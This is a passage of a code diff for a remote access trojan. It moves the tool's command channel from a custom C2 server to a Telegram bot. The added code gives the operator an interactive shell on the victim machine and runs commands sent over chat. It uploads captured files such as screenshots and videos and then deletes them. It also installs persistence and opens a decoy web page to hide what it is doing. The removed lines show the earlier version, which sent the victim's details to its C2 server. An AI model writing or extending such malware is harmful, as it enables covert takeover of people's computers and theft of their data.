+        return "🔌 Shutting down PC...", None
 
-            info_msg = json.dumps({
-                "type": "info",
-                "agent_id": agent_id,
-                "data": f"{username}|{os_version}"
-            })
-            send_packet(sock, info_msg)
+    else:
+        return f"❓ Unknown command: {cmd}", None
 
-            threading.Thread(target=heartbeat_loop, args=(sock, agent_id), daemon=True).start()
-            should_exit = handle_server(sock, agent_id)
-            if should_exit:
+# -----------------------------------------------------------------------------
+# 📨 Telegram message handler
+# -----------------------------------------------------------------------------
+def message_handler(message) -> None:
+    if message.from_user.id != OPERATOR_CHAT_ID:
+        return
+
+    text = message.text.strip()
+    if not text:
+        return
+
+    # Interactive shell forwarding
+    if shell_active:
+        clean = text[1:] if text.startswith('/') else text
+        if clean.lower() == "exit":
+            kill_shell()
+            bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown')
+        elif clean.lower().startswith("die"):
+            kill_shell()
+            execute_command("die")
+        else:
+            write_shell(clean)
+        return
+
+    # Normal command processing
+    if text.startswith('/'):
+        text = text[1:]
+
+    # Multi‑agent targeting (optional)
+    target_id = None
+    command_portion = text
+    if text.upper().startswith("ALL:"):
+        target_id = "ALL"
+        command_portion = text[4:].strip()
+    else:
+        for known_id in [SYSTEM_ID]:
+            if text.upper().startswith(known_id.upper() + ":"):
+                target_id = known_id
+                command_portion = text[len(known_id)+1:].strip()
                 break
+    if target_id is None:
+        target_id = "ALL"
 
+    if target_id != "ALL" and target_id.upper() != SYSTEM_ID.upper():
+        return
+
+    response, file_path = execute_command(command_portion)
+
+    if command_portion.startswith("die"):
+        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown')
+        os._exit(0)
+
+    safe_response = sanitise_markdown(response)
+    try:
+        bot.reply_to(message, f"```\n{safe_response}\n```", parse_mode='Markdown')
+    except:
+        bot.reply_to(message, safe_response, parse_mode=None)
+
+    if file_path and os.path.exists(file_path):
+        try:
+            with open(file_path, 'rb') as f:
+                if file_path.endswith(('.png', '.jpg', '.jpeg')):
+                    bot.send_photo(message.chat.id, f)
+                elif file_path.endswith(('.mp4', '.avi')):
+                    bot.send_video(message.chat.id, f)
+                else:
+                    bot.send_document(message.chat.id, f)
         except Exception as e:
-            time.sleep(10)
+            log(f"❌ File send error: {e}")
+            bot.reply_to(message, f"❌ Error sending file: {e}")
+        finally:
+            try:
+                os.remove(file_path)
+            except:
+                pass
 
+# Catch‑all for any text that isn't a recognised command
+bot.message_handler(func=lambda msg: True)(message_handler)
+
+# -----------------------------------------------------------------------------
+# 🚀 Main
+# -----------------------------------------------------------------------------
 if __name__ == "__main__":
-    Persist()
-    connect_to_c2()
+    log("🚀 Agent starting")
+    if not install_persistence():
+        log("⚠️ Persistence installation failed – continuing anyway.")
+    else:
+        log("💾 Persistence installed")
+
+    log(f"🆔 Agent ID: {SYSTEM_ID}")
+
+    send_log_to_telegram(bot)
+    webbrowser.open(DECOY_URL)
+
+    log("🔁 Entering main polling loop")
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=30)
+        except Exception as e:
+            log(f"⚠️ Polling error: {e}. Retrying in 10s...")
+            time.sleep(10)
